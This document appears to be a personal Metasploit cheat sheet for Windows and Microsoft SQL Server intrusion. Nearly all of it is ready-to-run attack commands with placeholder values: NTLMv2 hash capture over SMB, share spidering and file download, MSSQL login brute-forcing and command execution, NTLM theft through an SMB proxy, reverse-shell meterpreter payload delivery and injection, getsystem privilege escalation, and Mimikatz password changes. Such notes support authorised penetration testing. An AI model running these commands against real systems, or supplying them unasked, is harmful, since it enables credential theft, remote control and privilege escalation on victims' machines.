# Start capturing NTLMv2 over SMB
```ruby
use auxiliary/server/capture/smb
set VERBOSE true
run
```

# Start capturing all supported protocols
```ruby
load capture
captureg start --ip <ip>
```

# Enumerate SMB shares
## Options
```ruby
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <ip>
set SMBUser Guest
set ShowFiles true
set SpiderShares true
```

## Run
```ruby
 run -o ShowFiles=true,SpiderShares=true smb://guest@<ip>
```

# Download a file over SMB
## Options
```ruby
use auxiliary/admin/smb/download_file
set RHOSTS <ip>
set SMBUser Guest
set SMBSHARE "<share>"
set RPATH "\<path>\file"
```

## Run
```ruby
use auxiliary/admin/smb/download_file
run smb://guest@<ip>/<share>/<path>/<file>
# run smb://<user>:<password>@<ip>/<share>/<path>/<file>
```

# MSSQL Login 
## Options
```ruby
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <ip>
set PASSWORD <password>
set username <user>
set domain <domain>
set USE_WINDOWS_AUTHENT <true>
```

## Run
```ruby
use auxiliary/scanner/mssql/mssql_login
run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port> <ip>
``

# Microsoft SQL Server command execution
## Options
```ruby
use auxiliary/admin/mssql/mssql_exec
set RHOSTS <ip>
set PASSWORD <password>
set username <user>
set domain <domain>
set USE_WINDOWS_AUTHENT <true>
set CMD <whoami>
```

## Run
```ruby
use auxiliary/admin/mssql/mssql_exec
run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,CMD=<whoami> <ip>
```

# Microsoft SQL Server NTLM stealer
## Options
```ruby
use auxiliary/server/capture/smb
run
use admin/mssql/mssql_ntlm_stealer
set RHOSTS <ip>
set PASSWORD <password>
set username <user>
set domain <domain>
set SMBPROXY <ip_of_smb_sniffer>
set USE_WINDOWS_AUTHENT <true>
run
```

## Run
```ruby
use auxiliary/server/capture/smb
run
use admin/mssql/mssql_ntlm_stealer
run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,SMBPROXY=<ip_of_smb_sniffer> <ip>
```

#  Microsoft SQL Server payload execution
## Options
```ruby
use exploit/windows/mssql/mssql_payload
set RHOSTS <ip>
set PASSWORD <password>
set username <user>
set domain <domain>
set USE_WINDOWS_AUTHENT <true>
set SRVHOST <handler_listen_ip>
set SRVPORT <handler_listen_port>
set LHOST <payload_connect_to_ip>
set LPORT <payload_connect_to_port>
```

## Run
```ruby
use exploit/windows/mssql/mssql_payload
run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port> <ip>
```

# Spawn a new process and migrate to it
```ruby
use post/windows/manage/migrate
set session <1>
run
```

# Spawn new processes and initiate new meterpreter sessions
## Options
```ruby
use post/windows/manage/multi_meterpreter_inject
set AMOUNT <2>
set HANDLER <true>
set SESSION <1>
set IPLIST <payload_connect_to_ips>
set LPORT <payload_connect_to_port>
```

## Run
```ruby
use post/windows/manage/multi_meterpreter_inject
run AMOUNT=<2>,HANDLER=<true>,SESSION=<1>,IPLIST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port> <ip>
```

# Spawn a new process and initiate a new meterpreter session from it
## Options
```ruby
use exploit/windows/local/payload_inject
set AUTOUNHOOK <true>
set SESSION <1>
set LHOST <payload_connect_to_ip>
set LPORT <payload_connect_to_port>
```

## Options with a custom payload
```ruby
use exploit/windows/local/payload_inject
set AUTOUNHOOK <true>
set SESSION <1>
set PAYLOAD windows/meterpreter/reverse_tcp_rc4
set RC4PASSWORD <random_password> # head -10 /dev/random | sha256sum
set LHOST <payload_connect_to_ip>
set LPORT <payload_connect_to_port>
```

## Run
```ruby
run -o AUTOUNHOOK=<true>,SESSION=<1>,LHOST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port>
```

## Run with a custom payload
```ruby
run -o AUTOUNHOOK=<true>,SESSION=<1>,LHOST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port>,PAYLOAD='windows/meterpreter/reverse_tcp_rc4',RC4PASSWORD=<random_password>
```

# Get system
## Meterpreter
```ruby
# Per 2022-10-19
#    -t   The technique to use. (Default to '0').
#                0 : All techniques available
#                1 : Named Pipe Impersonation (In Memory/Admin)
#                2 : Named Pipe Impersonation (Dropper/Admin)
#                3 : Token Duplication (In Memory/Admin)
#                4 : Named Pipe Impersonation (RPCSS variant)
#                5 : Named Pipe Impersonation (PrintSpooler variant)
#                6 : Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
getsystem -t <6>
```

## Options
```ruby
use post/windows/escalate/getsystem
set SESSION <1>
set TECHNIQUE <6>
```

# Run
```ruby
use post/windows/escalate/getsystem
run -o SESSION=<1>,TECHNIQUE=<6>
```

# Migrate between architectures
```ruby
use post/windows/manage/archmigrate
set SESSION <1>
```

# Mimikatz
## Meterpreter
### Change password
```ruby
load kiwi
password_change -n <NTLM> -P <new_password> -u <user> -s <host>
```
